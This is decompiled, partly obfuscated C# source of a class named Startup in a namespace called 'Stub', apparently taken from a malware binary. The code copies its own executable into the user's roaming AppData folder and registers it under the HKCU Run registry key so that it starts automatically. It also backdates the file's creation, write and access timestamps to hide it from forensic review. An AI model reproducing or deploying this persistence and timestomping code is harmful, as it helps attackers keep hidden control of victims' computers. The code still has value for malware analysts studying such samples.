using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;
using rE4lpnT863QnijKQK5;
using wnAvGk2ZDkNgZ882lP8;

namespace Stub
{
	// Token: 0x020000B6 RID: 182
	internal sealed class Startup
	{
		// Token: 0x0600029E RID: 670 RVA: 0x00019C48 File Offset: 0x00017E48
		private static void EnsureInitialized()
		{
			if (!Startup._initialized)
			{
				object @lock = Startup._lock;
				lock (@lock)
				{
					if (!Startup._initialized)
					{
						try
						{
							Logging.Log("Startup: Initializing...", true);
							try
							{
								Process currentProcess = Process.GetCurrentProcess();
								Logging.Log(string.Format("Startup: Got current process: {0}", currentProcess.Id), true);
								ProcessModule mainModule = currentProcess.MainModule;
								if (mainModule == null)
								{
									Logging.Log("Startup: MainModule is null!", true);
									throw new InvalidOperationException("MainModule is null");
								}
								Startup._executablePath = mainModule.FileName;
								Logging.Log("Startup: Got ExecutablePath = " + Startup._executablePath, true);
							}
							catch (Exception ex)
							{
								Logging.Log("Startup: Error getting MainModule: " + ex.Message + "\nStack trace: " + ex.StackTrace, true);
								Startup._executablePath = GW7CRbzbOLtfg2w4jV.g4pwAn5NRFtE5(Assembly.GetExecutingAssembly());
								Logging.Log("Startup: Using fallback ExecutablePath = " + Startup._executablePath, true);
							}
							Startup._installDirectory = Paths.roamingAppData;
							Logging.Log("Startup: Got InstallDirectory = " + Startup._installDirectory, true);
							Startup._installFile = Path.Combine(Startup._installDirectory, new FileInfo(Startup._executablePath).Name);
							Logging.Log("Startup: Got InstallFile = " + Startup._installFile, true);
							Startup._initialized = true;
							Logging.Log("Startup: Initialization complete", true);
						}
						catch (Exception ex2)
						{
							Logging.Log("Startup: Fatal error during initialization: " + ex2.Message + "\nStack trace: " + ex2.StackTrace, true);
							throw;
						}
					}
				}
			}
		}

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x0600029F RID: 671 RVA: 0x00019E2C File Offset: 0x0001802C
		private static string ExecutablePath
		{
			get
			{
				Startup.EnsureInitialized();
				return Startup._executablePath;
			}
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x060002A0 RID: 672 RVA: 0x00019E48 File Offset: 0x00018048
		private static string InstallDirectory
		{
			get
			{
				Startup.EnsureInitialized();
				return Startup._installDirectory;
			}
		}

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x060002A1 RID: 673 RVA: 0x00019E64 File Offset: 0x00018064
		private static string InstallFile
		{
			get
			{
				Startup.EnsureInitialized();
				return Startup._installFile;
			}
		}

		// Token: 0x060002A2 RID: 674 RVA: 0x00019E80 File Offset: 0x00018080
		public static void EnsureDirectoryExists(string path)
		{
			if (!Directory.Exists(path))
			{
				Logging.Log("Directory does not exist, creating: " + path, true);
				Directory.CreateDirectory(path);
			}
		}

		// Token: 0x060002A3 RID: 675 RVA: 0x00019EB4 File Offset: 0x000180B4
		public static void SetFileCreationDate(string path = null)
		{
			string text = path ?? Startup.ExecutablePath;
			Logging.Log("SetFileCreationDate : Changing file " + text + " creation date", true);
			DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
			File.SetCreationTime(text, dateTime);
			File.SetLastWriteTime(text, dateTime);
			File.SetLastAccessTime(text, dateTime);
		}

		// Token: 0x060002A4 RID: 676 RVA: 0x00019F18 File Offset: 0x00018118
		public static bool IsInstalled()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
			return registryKey != null && registryKey.GetValue(Startup.StartupName) != null && File.Exists(Startup.InstallFile);
		}

		// Token: 0x060002A5 RID: 677 RVA: 0x00019F54 File Offset: 0x00018154
		public static void Install()
		{
			try
			{
				Logging.Log("Startup : Adding to autorun...", true);
				Startup.EnsureDirectoryExists(Startup.InstallDirectory);
				Logging.Log("ExecutablePath: " + Startup.ExecutablePath, true);
				Logging.Log("InstallFile: " + Startup.InstallFile, true);
				if (!File.Exists(Startup.InstallFile))
				{
					Logging.Log("Copying executable to install directory...", true);
					File.Copy(Startup.ExecutablePath, Startup.InstallFile);
				}
				else
				{
					Logging.Log("Executable already exists in install directory.", true);
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
				if (registryKey != null)
				{
					Logging.Log("Registry key opened successfully.", true);
					object value = registryKey.GetValue(Startup.StartupName);
					if (value == null)
					{
						Logging.Log("Setting registry value for startup...", true);
						registryKey.SetValue(Startup.StartupName, Startup.InstallFile);
						Logging.Log("Registry value set successfully.", true);
					}
					else
					{
						Logging.Log(string.Format("Registry value already set: {0}", value), true);
					}
				}
				else
				{
					Logging.Log("Failed to open registry key.", true);
				}
				Startup.SetFileCreationDate(Startup.InstallFile);
			}
			catch (Exception ex)
			{
				Logging.Log("Error during installation: " + ex.Message, true);
			}
		}

		// Token: 0x060002A6 RID: 678 RVA: 0x0001A0A0 File Offset: 0x000182A0
		public static bool IsFromStartup()
		{
			bool flag2;
			try
			{
				Logging.Log("IsFromStartup: Checking if " + Startup.ExecutablePath + " starts with " + Startup.InstallDirectory, true);
				bool flag = Startup.ExecutablePath.StartsWith(Startup.InstallDirectory);
				Logging.Log(string.Format("IsFromStartup: Result = {0}", flag), true);
				flag2 = flag;
			}
			catch (Exception ex)
			{
				Logging.Log("IsFromStartup: Error checking startup location: " + ex.Message + "\nStack trace: " + ex.StackTrace, true);
				throw;
			}
			return flag2;
		}

		// Token: 0x060002A7 RID: 679 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Startup()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060002A8 RID: 680 RVA: 0x00004008 File Offset: 0x00002208
		static Startup()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			Startup._lock = new object();
			Startup.StartupName = Path.GetFileNameWithoutExtension(Startup.ExecutablePath);
		}

		// Token: 0x04000568 RID: 1384
		private static string _executablePath;

		// Token: 0x04000569 RID: 1385
		private static string _installDirectory;

		// Token: 0x0400056A RID: 1386
		private static string _installFile;

		// Token: 0x0400056B RID: 1387
		private static bool _initialized;

		// Token: 0x0400056C RID: 1388
		private static readonly object _lock;

		// Token: 0x0400056D RID: 1389
		private static readonly string StartupName;
	}
}
